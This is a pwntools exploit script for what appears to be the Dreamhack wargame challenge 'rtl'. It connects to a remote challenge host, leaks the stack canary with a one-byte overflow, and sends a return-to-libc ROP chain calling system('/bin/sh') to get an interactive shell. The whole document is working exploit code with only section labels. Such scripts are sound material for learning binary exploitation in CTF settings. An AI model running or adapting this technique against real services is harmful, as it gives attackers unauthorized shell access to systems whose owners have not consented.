from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 20265)
e = ELF("./rtl")
libc = e.libc
r = ROP(e)


# [0] Gathering Information
system_plt = e.symbols['system']
sh = next(e.search(b'/bin/sh'))
pop_rdi = r.find_gadget(['pop rdi'])[0]
ret = r.find_gadget(['ret'])[0]
slog("system@plt", system_plt)
slog("/bin/sh", sh)
slog("pop rdi", pop_rdi)
slog("ret", ret)


# [1] Leak Canary
buf2sfp = 0x40
buf2cnry = 0x40 - 0x8
payload = b'A'*(buf2cnry + 1)
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recvn(7))
slog("Canary", canary)


# [2] Exploit
payload = b'A' * buf2cnry
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(sh)
payload += p64(system_plt)

pause()
p.sendafter("Buf: ", payload)

p.interactive()
